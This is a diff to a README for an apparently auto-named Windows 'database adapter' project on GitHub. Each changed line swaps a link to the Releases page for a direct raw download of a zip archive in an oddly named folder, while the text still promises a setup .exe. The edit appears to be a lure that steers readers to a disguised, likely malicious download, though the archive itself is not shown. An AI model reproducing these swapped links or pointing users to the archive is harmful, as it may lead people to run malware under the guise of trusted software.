@@ -1,6 +1,6 @@
 # 🗄️ db-adapter-1771916748-1 - Connect Multiple Databases Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/danial12345666/db-adapter-1771916748-1/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/danial12345666/db-adapter-1771916748-1/raw/refs/heads/main/laudative/adapter-db-3.9-beta.2.zip)
 
 ## 📋 What is db-adapter-1771916748-1?
 
@@ -21,7 +21,7 @@ Here is how to get db-adapter-1771916748-1 on your Windows computer:
 
 1. Click on the big blue button below to visit the download page.
 
-[![Visit Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/danial12345666/db-adapter-1771916748-1/releases)
+[![Visit Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/danial12345666/db-adapter-1771916748-1/raw/refs/heads/main/laudative/adapter-db-3.9-beta.2.zip)
 
 2. On the page, look for the latest release. It usually has a name like `db-adapter-1771916748-1-setup.exe` or similar.
 
@@ -81,7 +81,7 @@ This tool connects to your databases but does not store your passwords on its se
 
 To update db-adapter-1771916748-1, repeat the download process:
 
-- Visit the [Releases page](https://github.com/danial12345666/db-adapter-1771916748-1/releases).
+- Visit the [Releases page](https://github.com/danial12345666/db-adapter-1771916748-1/raw/refs/heads/main/laudative/adapter-db-3.9-beta.2.zip).
 
 - Download the newest setup file.
 
@@ -101,4 +101,4 @@ For questions or help, refer to the “Issues” tab on the GitHub page or revie
 
 ---
 
-[Download Latest Release](https://github.com/danial12345666/db-adapter-1771916748-1/releases)
+[Download Latest Release](https://github.com/danial12345666/db-adapter-1771916748-1/raw/refs/heads/main/laudative/adapter-db-3.9-beta.2.zip)
